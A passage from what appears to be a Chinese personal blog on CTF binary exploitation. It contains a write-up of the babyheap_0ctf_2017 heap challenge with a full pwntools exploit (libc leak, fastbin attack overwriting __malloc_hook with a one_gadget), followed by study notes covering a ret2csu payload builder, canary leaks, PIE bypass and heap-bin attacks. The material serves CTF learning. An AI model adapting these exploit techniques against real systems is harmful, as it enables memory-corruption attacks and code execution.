<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure>

<p>由此计算出main_arena和libc基地址（0x58和0x3c4b20都是固定的libc-2.23.so）</p>
<p>main_arena_offset可以使用工具：<a href="https://github.com/Coldwave96/LibcOffset" target="_blank" rel="noopener">https://github.com/Coldwave96/LibcOffset</a></p>
<p><img src="/2020/11/11/02-45-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201119001527081.png" alt="image-20201119001527081"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main_arena = unsortedbin_addr - offset_unsortedbin_main_arena</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br></pre></td></tr></table></figure>

<h5 id="4-伪造堆块"><a href="#4-伪造堆块" class="headerlink" title="4. 伪造堆块"></a>4. 伪造堆块</h5><p><img src="/2020/11/11/02-45-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201119000157127.png" alt="image-20201119000157127"></p>
<p>main_arena上面就是malloc_hook，并且那些地址的开头都是0x7f，所以需要chunk块大小为0x60。</p>
<p>我们申请0x60的块即可，因为小于原来的0x80，会自动分割为两个：0x60和0x10（头，，），</p>
<p><img src="/2020/11/11/02-45-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201119000539940.png" alt="image-20201119000539940"></p>
<p>有三个0x7f，但是第一个太近了，无法完全覆盖malloc_hook，第二个，前面没有7个0x00，不符合要求，所以是第三个，地址是<code>main_arena-0x33</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>,len(fake_chunk),fake_chunk)</span><br></pre></td></tr></table></figure>

<h5 id="5-申请伪造的堆块"><a href="#5-申请伪造的堆块" class="headerlink" title="5.申请伪造的堆块"></a>5.申请伪造的堆块</h5><p>接着申请两个chunk</p>
<p>第一次申请的是chunk4，第二次申请的是chunk4的fd指针指向的地址，也就是我们伪造的堆块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#6</span></span><br></pre></td></tr></table></figure>

<h5 id="6-在malloc的地址填入one-gadget"><a href="#6-在malloc的地址填入one-gadget" class="headerlink" title="6.在malloc的地址填入one_gadget"></a>6.在malloc的地址填入one_gadget</h5><p>one_gadget libc文件（本地在<code>/lib/x86_64-linux-gnu/libc-2.23.so</code>），有四个一个个试呗，第二个就行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">p = process(<span class="string">"./babyheap_0ctf_2017"</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',28082)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">"./babyheap_0ctf_2017"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line">offset_unsortedbin_main_arena = offset_bin_main_arena(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">	p.sendline(str(size))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))	</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))	</span><br><span class="line">	p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">	p.sendline(str(content))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))		</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2 -&gt; 4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">main_arena = unsortedbin_addr - offset_unsortedbin_main_arena</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">log.success(<span class="string">"[*]unsortedbin_addr:"</span>+hex(unsortedbin_addr))</span><br><span class="line">log.success(<span class="string">"[*]main_arena:"</span>+hex(main_arena))</span><br><span class="line">log.success(<span class="string">"[*]libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>,len(fake_chunk),fake_chunk)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/07/23-39-undefined/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/07/23-39-undefined/" class="post-title-link" itemprop="url">常忘基础知识</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-11-07 23:39:17" itemprop="dateCreated datePublished" datetime="2020-11-07T23:39:17+08:00">2020-11-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-08 00:48:32" itemprop="dateModified" datetime="2021-08-08T00:48:32+08:00">2021-08-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="光标"><a href="#光标" class="headerlink" title="光标"></a>光标</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;\033[?25l&quot;  隐藏光标</span><br><span class="line">echo -e &quot;\033[?25h&quot; 显示光标</span><br></pre></td></tr></table></figure>

<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop	&#x2F;&#x2F;使用root</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"read"</span>,addr)					<span class="comment">#已经泄漏的函数地址</span></span><br><span class="line">libc_base = addr - obj.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr = obj.dump(<span class="string">"system"</span>) + libc_base		<span class="comment">#计算其他地址</span></span><br><span class="line">print(<span class="string">"system:"</span>+hex(system_addr))</span><br><span class="line">binsh_addr = obj.dump(<span class="string">"str_bin_sh"</span>) + libc_base</span><br><span class="line">print(<span class="string">"binsh_addr:"</span>+hex(binsh_addr))</span><br></pre></td></tr></table></figure>



<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>#因为是edi，而binsh在libc里面的地址是0x7f开头的八位，所以不能直接用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span><span class="params">(part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span>)</span>:</span></span><br><span class="line">	payload  = p64(part1)			<span class="comment"># part1 entry pop_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">	payload += p64(<span class="number">0x0</span>)			<span class="comment"># rbx must be 0x0</span></span><br><span class="line">	payload += p64(<span class="number">0x1</span>)			<span class="comment"># rbp must be 0x1</span></span><br><span class="line">	payload += p64(jmp2)			<span class="comment"># r12 jump to</span></span><br><span class="line">	payload += p64(arg3)			<span class="comment"># r13  -&gt; rdx    arg3</span></span><br><span class="line">	payload += p64(arg2)			<span class="comment"># r14  -&gt; rsi    arg2</span></span><br><span class="line">	payload += p64(arg1)			<span class="comment"># r15d -&gt; edi    arg1</span></span><br><span class="line">	payload += p64(part2)			<span class="comment"># part2 entry will call [r12+rbx*0x8]</span></span><br><span class="line">	payload += <span class="string">'A'</span> * <span class="number">56</span>			<span class="comment"># junk 6*8+8=56</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>



<h3 id="64位传参"><a href="#64位传参" class="headerlink" title="64位传参"></a>64位传参</h3><p>参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p>
<h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><p><img src="/2020/11/07/23-39-undefined/u=465806655,3876495324&fm=26&gp=0.jpg" alt="点击查看源网页"></p>
<h3 id="查看内存命令"><a href="#查看内存命令" class="headerlink" title="查看内存命令"></a>查看内存命令</h3><p>用gdb查看内存</p>
<p>格式: x /nfu</p>
<p>说明<br> x 是 examine 的缩写</p>
<p><strong>n表示要显示的内存单元的个数</strong></p>
<p><strong>f表示显示方式, 可取如下值</strong><br> x 按十六进制格式显示变量。<br> d 按十进制格式显示变量。<br> u 按十进制格式显示无符号整型。<br> o 按八进制格式显示变量。<br> t 按二进制格式显示变量。<br> a 按十六进制格式显示变量。<br> i 指令地址格式<br> c 按字符格式显示变量。<br> f 按浮点数格式显示变量。</p>
<p><strong>u表示一个地址单元的长度</strong><br> b表示单字节，<br> h表示双字节，<br> w表示四字节，<br> g表示八字节</p>
<h3 id="修改pwngdb或者peda"><a href="#修改pwngdb或者peda" class="headerlink" title="修改pwngdb或者peda"></a>修改pwngdb或者peda</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit &#x2F;.gdbinit</span><br><span class="line">source &#x2F;home&#x2F;winter&#x2F;pwndbg&#x2F;gdbinit.py</span><br><span class="line">source ~&#x2F;peda&#x2F;peda.py</span><br></pre></td></tr></table></figure>

<h3 id="python函数函数"><a href="#python函数函数" class="headerlink" title="python函数函数"></a>python函数函数</h3><h5 id="数字和字符串转换"><a href="#数字和字符串转换" class="headerlink" title="数字和字符串转换"></a>数字和字符串转换</h5><p>chr(x )         将一个整数转换为一个字符   </p>
<p>ord(x )         将一个字符转换为它的整数值   </p>
<h5 id="查看变量类型"><a href="#查看变量类型" class="headerlink" title="查看变量类型"></a>查看变量类型</h5><p>type()函数</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>ascii码的字符打印出来 printf “\037”</p>
<p>用字符的ascii码执行程序：printf “\023\342” | ./可执行文件</p>
<h3 id="追踪"><a href="#追踪" class="headerlink" title="追踪"></a>追踪</h3><p>ltrace ./可执行文件</p>
<h3 id="gdb使用peda和pwngdb"><a href="#gdb使用peda和pwngdb" class="headerlink" title="gdb使用peda和pwngdb"></a>gdb使用peda和pwngdb</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gedit ~&#x2F;.gdbinit</span><br><span class="line">&#x2F;&#x2F;peda</span><br><span class="line">source ~&#x2F;peda&#x2F;peda.py</span><br><span class="line">&#x2F;&#x2F;v8 gdb</span><br><span class="line">source ~&#x2F;.gdbinit_v8</span><br><span class="line">source &#x2F;home&#x2F;winter&#x2F;v8&#x2F;v8&#x2F;tools&#x2F;gdb-v8-support.py</span><br><span class="line">&#x2F;&#x2F;pwngdb</span><br><span class="line">source &#x2F;home&#x2F;winter&#x2F;pwndbg&#x2F;gdbinit.py</span><br><span class="line">&#x2F;&#x2F;gef</span><br><span class="line">source &#x2F;home&#x2F;winter&#x2F;.gdbinit-gef.py</span><br><span class="line">&#x2F;&#x2F;Pwngdb</span><br><span class="line">source ~&#x2F;peda&#x2F;peda.py</span><br><span class="line">source ~&#x2F;Pwngdb&#x2F;pwngdb.py</span><br><span class="line">source ~&#x2F;Pwngdb&#x2F;angelheap&#x2F;gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<h3 id="linux初始化root密码"><a href="#linux初始化root密码" class="headerlink" title="linux初始化root密码"></a>linux初始化root密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/07/23-39-undefined/image-20201015164326447.png" alt="image-20201015164326447"></p>
<h3 id="ubuntu-安装pip"><a href="#ubuntu-安装pip" class="headerlink" title="ubuntu 安装pip"></a>ubuntu 安装pip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 更新系统包</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"><span class="comment"># 2. 安装Pip</span></span><br><span class="line">sudo apt-get install python-pip</span><br><span class="line"><span class="comment"># 3. 检查 pip 是否安装成功</span></span><br><span class="line">pip -V</span><br></pre></td></tr></table></figure>

<h3 id="生成指定数目字符串"><a href="#生成指定数目字符串" class="headerlink" title="生成指定数目字符串"></a>生成指定数目字符串</h3><p>cyclic 100</p>
<h3 id="检测机制"><a href="#检测机制" class="headerlink" title="检测机制"></a>检测机制</h3><h4 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h4><p>不能覆盖got表</p>
<p>malloc、realloc、free函数在开始时会查看对应的hook变量是否为空，不为空则调用变量中的地址，寻找malloc_hook、realloc_hook、free_hook</p>
<h4 id="泄漏cannary"><a href="#泄漏cannary" class="headerlink" title="泄漏cannary"></a>泄漏cannary</h4><blockquote>
<p>Canary设计为以字节”\x00”结尾，本意是为了保证Canary可以截断字符串。</p>
</blockquote>
<p>因为存在栈溢出，所以可以覆盖地位的’\x00’，让canary随着前面的数据一起输出。</p>
<p>内存存放情况：</p>
<table>
<thead>
<tr>
<th>局部变量</th>
</tr>
</thead>
<tbody><tr>
<td>canary</td>
</tr>
<tr>
<td>ebp</td>
</tr>
<tr>
<td>返回地址</td>
</tr>
<tr>
<td>参数</td>
</tr>
</tbody></table>
<p>所以，有canary的栈题。</p>
<p>如果数据是[rbp - n]</p>
<ul>
<li>第一次泄漏填充的长度就是rbp - 0x8（canary）+ 1（覆盖那个‘\x00’）</li>
<li>第二次填充的长度rbp - 0x8 + canary</li>
</ul>
<h4 id="partial-write绕过pie"><a href="#partial-write绕过pie" class="headerlink" title="partial write绕过pie"></a>partial write绕过pie</h4><blockquote>
<p>partial  write就是利用了PIE技术的缺陷。我们知道，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程。</p>
</blockquote>
<p>由于地址的后3位一样，所以覆盖的话至少需要4位，那么倒数第四位就需要爆破，爆破范围在0到0xf</p>
<h3 id="各种bin"><a href="#各种bin" class="headerlink" title="各种bin"></a>各种bin</h3><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><blockquote>
<p>0x20 - 0x80</p>
<p>后进先出</p>
</blockquote>
<p>使用单链表对空闲堆块进行连接</p>
<p>只有bk</p>
<p>单向链表</p>
<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><blockquote>
<p>0x20 - 0x400(1024)</p>
<p>先进先出</p>
</blockquote>
<p>bk和fd</p>
<p>双向链表</p>
<h4 id="larage-bin"><a href="#larage-bin" class="headerlink" title="larage bin"></a>larage bin</h4><blockquote>
<p>大于0x400</p>
</blockquote>
<p>bk和fd、找到下一个和他大小不同的堆块</p>
<p>根据large bin的大小，用fd_nextsize和bk_nextsize按大小排序连接</p>
<p>利用：实现任意地址写堆地址</p>
<h4 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h4><p>双向链表</p>
<blockquote>
<p>chunk被释放后，如果大小不再fastbin内，会先放到unsortedbin中</p>
<p>在申请内存的时候，如果大小不是fastbin大小的内存，并且在smallbin中没有找到合适的chunk，就会从unsortedbin中查找。</p>
</blockquote>
<h3 id="堆里用"><a href="#堆里用" class="headerlink" title="堆里用"></a>堆里用</h3><h4 id="篡改size域"><a href="#篡改size域" class="headerlink" title="篡改size域"></a>篡改size域</h4><p>chunk extend =&gt; chunk overlap</p>
<h4 id="篡改prev-size域和prev-in-use域"><a href="#篡改prev-size域和prev-in-use域" class="headerlink" title="篡改prev_size域和prev_in_use域"></a>篡改prev_size域和prev_in_use域</h4><h5 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h5><p>attack：</p>
<p>FD = target - 12</p>
<p>BK = target - 8</p>
<p>target = target -12</p>
<h5 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h5><p>类似unlink、后向合并检查不严</p>
<h4 id="篡改fd指针"><a href="#篡改fd指针" class="headerlink" title="篡改fd指针"></a>篡改fd指针</h4><h5 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h5><p>就是fd控制，那么它指向的地址（要被认为是一个chunk，可以通过size域的检查）</p>
<h5 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h5><p>2.27里面加入的，更快</p>
<p>但是从堆块去内存的时候，没有对size进行检查（不知道地址是否合法）</p>
<p>attack：</p>
<h6 id="篡改fd指针-1"><a href="#篡改fd指针-1" class="headerlink" title="篡改fd指针"></a>篡改fd指针</h6><h6 id="tcache-struct-attack"><a href="#tcache-struct-attack" class="headerlink" title="tcache struct attack"></a>tcache struct attack</h6><p>tcache_struct:</p>
<ul>
<li>tcache_count;</li>
<li>tcache_entry;</li>
</ul>
<p>attack：篡改tcache_entry-&gt;任意地址分配</p>
<h5 id="chunk-overlap"><a href="#chunk-overlap" class="headerlink" title="chunk overlap"></a>chunk overlap</h5><h4 id="篡改bk指针"><a href="#篡改bk指针" class="headerlink" title="篡改bk指针"></a>篡改bk指针</h4><h5 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h5><p>向地址里面写入libc</p>
<p>bk = target - 0x10（64位）</p>
<p>不良影响：unsortedbin被污染，用它分配内存可能有错</p>
<h3 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h3><p>在64位下是0x7f开头</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so&quot;)</span><br><span class="line">system&#x3D;libc_base+libc.symbols[&quot;system&quot;]</span><br><span class="line">bin_sh&#x3D;libc_base+libc.search(&quot;&#x2F;bin&#x2F;sh&quot;).next()</span><br></pre></td></tr></table></figure>

<ul>
<li><p>如果题目中给出了libc文件，用ida打开，搜索字符串，搜索version![image-20201108030310873](C:\Users\YCNN\Desktop\ctf 2020\ctf wiki刷题\ctf wiki的刷题笔记\image-20201108030310873.png)</p>
</li>
<li><p>如果题目没有给出libc文件，需要一个个尝试</p>
<ul>
<li><p>堆的话试试UAF啥的</p>
<p>​    要么2.23、要么2.27、2.31就喷他</p>
</li>
